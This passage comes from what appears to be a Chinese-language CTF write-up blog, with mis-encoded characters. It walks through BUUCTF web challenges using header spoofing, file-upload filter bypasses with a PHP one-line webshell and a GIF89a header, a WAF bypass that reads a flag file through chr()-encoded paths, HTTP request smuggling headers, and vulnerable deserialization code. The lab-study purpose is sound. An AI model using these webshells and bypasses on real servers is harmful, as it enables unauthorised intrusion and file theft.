<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Syclover</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420138.png" alt="image-20220111142004093"></p>
<p>è¿˜æ˜¯ä¸è¡Œï¼Œæç¤ºéœ€è¦ä»æœ¬åœ°localè¯»å–</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420811.png" alt="image-20220111142051767"></p>

        <h3 id="3-ä¿®æ”¹X-Forwarded-For"   >
          <a href="#3-ä¿®æ”¹X-Forwarded-For" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ä¿®æ”¹X-Forwarded-For" class="headerlink" title="(3)ä¿®æ”¹X-Forwarded-For"></a>(3)ä¿®æ”¹X-Forwarded-For</h3>
      <p>æ·»åŠ å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422737.png" alt="image-20220111142201689"></p>
<p>å‘é€åå¾—åˆ°flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422352.png" alt="image-20220111142221310"></p>

        <h1 id="åä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Upload"   >
          <a href="#åä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#åä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="åä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>åä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h1>
      
        <h2 id="ğŸ”ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€ä¸€å¥è¯æœ¨é©¬"   >
          <a href="#ğŸ”ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€ä¸€å¥è¯æœ¨é©¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ğŸ”ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€ä¸€å¥è¯æœ¨é©¬"></a>ğŸ”ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€ä¸€å¥è¯æœ¨é©¬</h2>
      
        <h2 id="1-å‰æœŸæ¢ç´¢-3"   >
          <a href="#1-å‰æœŸæ¢ç´¢-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰æœŸæ¢ç´¢-3" class="headerlink" title="1.å‰æœŸæ¢ç´¢"></a>1.å‰æœŸæ¢ç´¢</h2>
      <p>è¿›å…¥ä¹‹åå‘ç°è®©é€‰æ‹©å›¾ç‰‡è¿›è¡Œä¸Šä¼ ï¼Œé‚£ä¹ˆå°±è€ƒè™‘ä¸€å¥è¯æœ¨é©¬çš„éšå†™ï¼Œç„¶åå†ä¸Šä¼ </p>
<p>é¦–å…ˆå°è¯•ä¸Šä¼ .phpæ–‡ä»¶ï¼Œå¤±è´¥ï¼Œæ¥ç€è€ƒè™‘æµ‹ç»•è¿‡ã€‚</p>

        <h2 id="2-ç»•è¿‡è¿‡æ»¤-1"   >
          <a href="#2-ç»•è¿‡è¿‡æ»¤-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç»•è¿‡è¿‡æ»¤-1" class="headerlink" title="2.ç»•è¿‡è¿‡æ»¤"></a>2.ç»•è¿‡è¿‡æ»¤</h2>
      
        <h3 id="1-ä¿®æ”¹Content-Type"   >
          <a href="#1-ä¿®æ”¹Content-Type" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¿®æ”¹Content-Type" class="headerlink" title="(1)ä¿®æ”¹Content-Type"></a>(1)ä¿®æ”¹Content-Type</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202373.png" alt="image-20220112120212319"></p>
<p>å¤±è´¥ï¼Œåç¼€åä¸èƒ½ä¸º.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202287.png" alt="image-20220112120239252"></p>

        <h3 id="2-ä¿®æ”¹åç¼€å"   >
          <a href="#2-ä¿®æ”¹åç¼€å" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä¿®æ”¹åç¼€å" class="headerlink" title="(2)ä¿®æ”¹åç¼€å"></a>(2)ä¿®æ”¹åç¼€å</h3>
      <p>ä¿®æ”¹ä¸ºphtmlï¼Œè¿™ç§æ ¼å¼åœ¨æœåŠ¡å™¨ä¹Ÿä¼šè¢«ä½œä¸ºphpæ–‡ä»¶è§£æã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121204190.png" alt="image-20220112120451143"></p>
<p>æˆåŠŸï¼Œä½†æ˜¯ä¸èƒ½æ˜¯<code>&lt;?</code>å¼€å¤´ï¼Œé‚£ä¹ˆå°è¯•ä½¿ç”¨htmlæ ¼å¼ã€‚è¿˜æœ‰çš„phpæ–‡ä»¶åç¼€åå¯ä»¥ä¿®æ”¹å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- åˆ©ç”¨ä¸­é—´ä»¶è§£ææ¼æ´ç»•è¿‡æ£€æŸ¥ï¼Œå®æˆ˜å¸¸ç”¨</span><br><span class="line">- ä¸Šä¼ .user.iniæˆ–.htaccesså°†åˆæ³•æ‹“å±•åæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æ</span><br><span class="line">- %00æˆªæ–­ç»•è¿‡</span><br><span class="line">- php3æ–‡ä»¶</span><br><span class="line">- php4æ–‡ä»¶</span><br><span class="line">- php5æ–‡ä»¶</span><br><span class="line">- php7æ–‡ä»¶</span><br><span class="line">- phtmlæ–‡ä»¶</span><br><span class="line">- phpsæ–‡ä»¶</span><br><span class="line">- phtæ–‡ä»¶</span><br></pre></td></tr></table></div></figure>

<p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12403922.html" >BUUOJè®°å½•] [ACTF2020 æ–°ç”Ÿèµ›]Upload - Yeâ€™sBlog - åšå®¢å›­ (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="3-ä¿®æ”¹phpæ ¼å¼"   >
          <a href="#3-ä¿®æ”¹phpæ ¼å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ä¿®æ”¹phpæ ¼å¼" class="headerlink" title="(3)ä¿®æ”¹phpæ ¼å¼"></a>(3)ä¿®æ”¹phpæ ¼å¼</h3>
      <p>ä¿®æ”¹å†…å®¹ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121206053.png" alt="image-20220112120616999"></p>
<p>æˆåŠŸï¼Œä½†æ˜¯ä¹Ÿè¢«æ¢æµ‹åˆ°ï¼Œé‚£ä¹ˆå°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨æ ¼å¼</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121207056.png" alt="image-20220112120712009"></p>

        <h3 id="4-å°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨"   >
          <a href="#4-å°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-å°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨" class="headerlink" title="(4)å°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨"></a>(4)å°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨</h3>
      <p>åœ¨æ–‡ä»¶å¤´åŠ ä¸Š<code>GIF89a</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210799.png" alt="image-20220112121007758"></p>
<p>ä¸Šä¼ æˆåŠŸ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210905.png" alt="image-20220112121056862"></p>

        <h2 id="3-æŸ¥æ‰¾ä¸Šä¼ æ–‡ä»¶è·¯å¾„"   >
          <a href="#3-æŸ¥æ‰¾ä¸Šä¼ æ–‡ä»¶è·¯å¾„" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æŸ¥æ‰¾ä¸Šä¼ æ–‡ä»¶è·¯å¾„" class="headerlink" title="3.æŸ¥æ‰¾ä¸Šä¼ æ–‡ä»¶è·¯å¾„"></a>3.æŸ¥æ‰¾ä¸Šä¼ æ–‡ä»¶è·¯å¾„</h2>
      <p>ä¸€èˆ¬è€Œè¨€ï¼Œä¸Šä¼ çš„éƒ½åœ¨uploadï¼ŒæˆåŠŸæ‰¾åˆ°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121213219.png" alt="image-20220112121305153"></p>
<p>é‚£ä¹ˆèšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121218740.png" alt="image-20220112121815697"></p>

        <h1 id="åå››ã€-ACTF2020-æ–°ç”Ÿèµ›-Upload"   >
          <a href="#åå››ã€-ACTF2020-æ–°ç”Ÿèµ›-Upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#åå››ã€-ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="åå››ã€[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>åå››ã€[ACTF2020 æ–°ç”Ÿèµ›]Upload</h1>
      <p>å’Œåä¸‰é¢˜ä¸€æ ·ï¼Œç›´æ¥ä¸€å¥è¯æœ¨é©¬ï¼Œæ–‡ä»¶æ ¼å¼ä¸ºphtmlï¼Œä¿®æ”¹content-typeå³å¯ï¼Œç„¶åèšå‰‘è¿ä¸Šåœ¨æ ¹ç›®å½•ä¸‹æ‰¾flagã€‚éœ€è¦æ³¨æ„çš„æ˜¯è¦å…ˆä¸Šä¼ æˆåŠŸä¸€ä¸ªæ–‡ä»¶æ‰ä¼šæŠ“åˆ°ä¸Šä¼ çš„åŒ…ï¼Œå› ä¸ºè¿™é‡Œçš„éªŒè¯æ˜¯åœ¨å‰ç«¯éªŒè¯åç¼€åçš„ã€‚</p>

        <h1 id="åäº”ã€-RoarCTF-2019-Easy-Calc"   >
          <a href="#åäº”ã€-RoarCTF-2019-Easy-Calc" class="heading-link"><i class="fas fa-link"></i></a><a href="#åäº”ã€-RoarCTF-2019-Easy-Calc" class="headerlink" title="åäº”ã€[RoarCTF 2019]Easy Calc"></a>åäº”ã€[RoarCTF 2019]Easy Calc</h1>
      
        <h2 id="ğŸ”ºå‘½ä»¤æ‰§è¡Œã€phpå­—ç¬¦ä¸²è§£æã€HTTPèµ°ç§æ”»å‡»"   >
          <a href="#ğŸ”ºå‘½ä»¤æ‰§è¡Œã€phpå­—ç¬¦ä¸²è§£æã€HTTPèµ°ç§æ”»å‡»" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºå‘½ä»¤æ‰§è¡Œã€phpå­—ç¬¦ä¸²è§£æã€HTTPèµ°ç§æ”»å‡»" class="headerlink" title="ğŸ”ºå‘½ä»¤æ‰§è¡Œã€phpå­—ç¬¦ä¸²è§£æã€HTTPèµ°ç§æ”»å‡»"></a>ğŸ”ºå‘½ä»¤æ‰§è¡Œã€phpå­—ç¬¦ä¸²è§£æã€HTTPèµ°ç§æ”»å‡»</h2>
      
        <h2 id="1-å‰æœŸæ¢ç´¢-4"   >
          <a href="#1-å‰æœŸæ¢ç´¢-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰æœŸæ¢ç´¢-4" class="headerlink" title="1.å‰æœŸæ¢ç´¢"></a>1.å‰æœŸæ¢ç´¢</h2>
      <p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°å¦‚ä¸‹.phpæ–‡ä»¶</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121906058.png" alt="image-20220112190657868"></p>
<p>è®¿é—®ä¸€ä¸‹ï¼Œå‘ç°æºä»£ç ï¼Œåˆ†æè¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œç„¶åæˆ‘ä»¬è¾“å…¥çš„numå­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œå¹¶ä¸”ä½¿ç”¨evalæ‰§è¡Œåè¾“å‡º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121912749.png" alt="image-20220112191231694"></p>
<p>ä¸»è¦ä»¥ä¸‹ä»£ç ï¼Œè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œç„¶åæ‰§è¡Œè¾“å‡º</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>

<p>å°è¯•phpinfo()ï¼Œå‘ç°ç›´æ¥æŠ¥é”™ï¼Œå¤§ä½¬ä»¬è¯´æ˜¯Wafçš„åŸå› ï¼Œå…·ä½“ä¹Ÿä¸å¤ªçŸ¥é“æ€ä¹ˆåˆ¤æ–­å‡ºWafçš„ï¼Œç»è¿‡æµ‹è¯•ï¼Œè¿™é‡Œçš„wafä¼šè¿‡æ»¤æ‰æ‰€æœ‰å¸¦å­—æ¯çš„numå˜é‡å†…å®¹ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131203691.png" alt="image-20220113115855930"></p>
<p>æ‰€ä»¥å¤§æ¦‚æœ‰ä¸¤ç§æ–¹æ³•</p>

        <h2 id="2-è§£å†³æ–¹æ³•"   >
          <a href="#2-è§£å†³æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è§£å†³æ–¹æ³•" class="headerlink" title="2.è§£å†³æ–¹æ³•"></a>2.è§£å†³æ–¹æ³•</h2>
      
        <h3 id="è§£æ³•ä¸€ï¼šåˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF"   >
          <a href="#è§£æ³•ä¸€ï¼šåˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ³•ä¸€ï¼šåˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF" class="headerlink" title="è§£æ³•ä¸€ï¼šåˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF"></a>è§£æ³•ä¸€ï¼šåˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF</h3>
      
        <h4 id="1-ç»•è¿‡WAF"   >
          <a href="#1-ç»•è¿‡WAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ç»•è¿‡WAF" class="headerlink" title="(1)ç»•è¿‡WAF"></a>(1)ç»•è¿‡WAF</h4>
      <p>åˆ©ç”¨phpè§£æå­—ç¬¦ä¸²æ—¶ï¼Œä¼šè‡ªåŠ¨å»æ‰å¤šä½™çš„ç©ºæ ¼è¿™ä¸ªç‰¹æ€§ï¼Œå³å½“æˆ‘ä»¬è°ƒè¯•æ—¶</p>
<p>è¾“å…¥ä¸­é—´åŠ å…¥äº†ç©ºæ ¼çš„numï¼Œå‘ç°phpä¾ç„¶èƒ½å¤ŸæˆåŠŸè§£æå‡ºnumè¿™ä¸ªå˜é‡</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?%20num=phpinfo()</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156038.png" alt="image-20220113115626996"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156886.png" alt="image-20220113115655830"></p>
<p>ä½†æ˜¯WAFå¯ä¸ä¼šç®¡ç©ºä¸ç©ºæ ¼çš„ï¼Œå¯¹äºWafæ¥è¯´ï¼Œä¼ è¿‡å»çš„æ˜¯å¸¦äº†ç©ºæ ¼çš„numå˜é‡ï¼Œä¸æ˜¯numå˜é‡ï¼Œæ‰€ä»¥ä¸ä¼šè¿›è¡Œè¿‡æ»¤ï¼Œä¼šå°†å¸¦äº†ç©ºæ ¼çš„numå˜é‡ä¼ é€’ç»™calc.phpæ–‡ä»¶è¿›è¡Œè§£æï¼Œè¿™æ ·å°±æˆåŠŸç»•è¿‡äº†WAFã€‚</p>

        <h4 id="2-ç»•è¿‡è¿‡æ»¤-2"   >
          <a href="#2-ç»•è¿‡è¿‡æ»¤-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç»•è¿‡è¿‡æ»¤-2" class="headerlink" title="(2)ç»•è¿‡è¿‡æ»¤"></a>(2)ç»•è¿‡è¿‡æ»¤</h4>
      <p>ç”±äºè¿‡æ»¤äº†<code>/</code>ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨<code>chr(47)</code>æ¥è¿›è¡Œç»•è¿‡ï¼Œè¿™æ˜¯<code>/</code>å­—ç¬¦çš„asciiç </p>
<p>å…ˆæŸ¥çœ‹æ ¹ç›®å½•ä¸‹æœ‰ä»€ä¹ˆå†…å®¹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%20num=var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></div></figure>

<p>å‘ç°æœ‰flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131211277.png" alt="image-20220113121152229"></p>
<p>é‚£ä¹ˆåˆ©ç”¨phpä¸­çš„å‡½æ•°è¿›è¡Œè·å–</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></div></figure>

<p>å¾—åˆ°flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131212797.png" alt="image-20220113121256750"></p>

        <h3 id="è§£æ³•äºŒï¼šåˆ©ç”¨HTTPèµ°ç§æ”»å‡»"   >
          <a href="#è§£æ³•äºŒï¼šåˆ©ç”¨HTTPèµ°ç§æ”»å‡»" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ³•äºŒï¼šåˆ©ç”¨HTTPèµ°ç§æ”»å‡»" class="headerlink" title="è§£æ³•äºŒï¼šåˆ©ç”¨HTTPèµ°ç§æ”»å‡»"></a>è§£æ³•äºŒï¼šåˆ©ç”¨HTTPèµ°ç§æ”»å‡»</h3>
      <p>è¿™ä¸ªå…·ä½“çš„åŸç†å®åœ¨æ˜¯æœ‰ç‚¹ä¸å¤ªèƒ½ç†è§£ï¼Œå¯èƒ½éœ€è¦æ·±å…¥ç ”ç©¶ä¸€ä¸‹ã€‚ä»¥æˆ‘çš„ç†è§£æ¥è¯´ï¼Œå°±æ˜¯é€šè¿‡ä¿®æ”¹<code>content-length</code>æˆ–è€…<code>Transfer-Encoding</code>ï¼Œæ¥ä½¿å¾—æ•°æ®åŒ…åœ¨å‰åç«¯è§£æçš„è¿‡ç¨‹ä¸­ï¼Œè®©å‰ç«¯ä»¥ä¸ºè¯¥æ•°æ®åŒ…çš„å†…å®¹æ¯”è¾ƒå°‘ï¼Œä½¿å…¶è®¤ä¸ºä¸åŒ…å«éœ€è¦è¿‡æ»¤çš„å†…å®¹ï¼Œä»è€ŒæŠŠå®Œæ•´çš„æ•°æ®åŒ…å‘ç»™åç«¯ï¼Œç»•è¿‡å‰ç«¯çš„Wafç­‰è¿‡æ»¤ã€‚</p>
<p>BurpSuitæŠ“åŒ…ä¹‹åï¼Œä¿®æ”¹<code>content-length</code>æˆ–è€…<code>Transfer-Encoding</code></p>

        <h4 id="1-åˆ©ç”¨CL-CL"   >
          <a href="#1-åˆ©ç”¨CL-CL" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆ©ç”¨CL-CL" class="headerlink" title="(1)åˆ©ç”¨CL-CL"></a>(1)åˆ©ç”¨CL-CL</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131507999.png" alt="image-20220113150704935"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 0</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></div></figure>


        <h4 id="2-åˆ©ç”¨CL-TE"   >
          <a href="#2-åˆ©ç”¨CL-TE" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åˆ©ç”¨CL-TE" class="headerlink" title="(2)åˆ©ç”¨CL-TE"></a>(2)åˆ©ç”¨CL-TE</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131518370.png" alt="image-20220113151848304"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 3</span><br></pre></td></tr></table></div></figure>

<p>æœ‰æ—¶å€™åˆå¾ˆå¥‡æ€ªï¼Œå°±ç¦»è°±ã€‚</p>
<p>åŒæ—¶GETæ”¹æˆPOSTä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p>
<p>åé¢éƒ½ä¸€æ ·äº†ï¼Œå°±æ˜¯ç»•è¿‡åç«¯çš„è¿‡æ»¤ã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html" >4.17. HTTP è¯·æ±‚èµ°ç§ â€” Webå®‰å…¨å­¦ä¹ ç¬”è®° 1.0 æ–‡æ¡£ (websec.readthedocs.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="åå…­ã€-æå®¢å¤§æŒ‘æˆ˜-2019-PHP"   >
          <a href="#åå…­ã€-æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#åå…­ã€-æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="åå…­ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>åå…­ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h1>
      
        <h2 id="ğŸ”ºPHPååºåˆ—åŒ–"   >
          <a href="#ğŸ”ºPHPååºåˆ—åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºPHPååºåˆ—åŒ–" class="headerlink" title="ğŸ”ºPHPååºåˆ—åŒ–"></a>ğŸ”ºPHPååºåˆ—åŒ–</h2>
      
        <h2 id="1-åˆ†æ"   >
          <a href="#1-åˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆ†æ" class="headerlink" title="1.åˆ†æ"></a>1.åˆ†æ</h2>
      <p><code>dirsearch</code>æ‰«æå‘ç°<code>www.zip</code>ï¼Œè¯¥æ–‡ä»¶ä¸ºç½‘å€å¤‡ä»½æ–‡ä»¶ï¼Œå¯ä»¥ä¸‹è½½ä¸‹æ¥ï¼Œå…¶ä¸­ä¸º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220710161845497.png" alt="image-20220710161845497"></p>
<p>ä¹‹åçœ‹<code>index.php</code>ä¸­æœ‰å¦‚ä¸‹ä»£ç </p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220710161859892.png" alt="image-20220710161859892"></p>
<p>å†è½¬åˆ°<code>class.php</code></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

